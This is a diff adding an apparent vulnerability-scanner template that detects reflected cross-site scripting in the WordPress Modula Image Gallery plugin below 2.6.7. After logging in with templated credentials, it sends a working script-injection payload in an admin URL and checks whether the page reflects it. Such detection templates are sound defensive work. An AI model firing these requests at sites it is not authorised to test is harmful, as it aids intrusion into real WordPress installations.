@@ -1,0 +1,49 @@
+id: modula-image-gallery-xss
+
+info:
+  name: WordPress Modula Image Gallery <2.6.7 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
+  reference:
+    - https://wpscan.com/vulnerability/ee248078-89ee-4cc0-b0fe-e932cd00db3e
+    - https://wordpress.org/plugins/modula-best-grid-gallery
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 2
+  tags: authenticated,wpscan,wp-plugin,xss,wp,wordpress
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '&a\"><script>alert(1)</script>&extensions='
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a004830460221008d69e7d6d87f467b236a698fd690a619867f80906911556eeb78667423b87b87022100ac0757af7dae6377214c482932b99adb91f50e14341512f54da2c5613b345799:922c64590222798bb761d5b6d8e72950
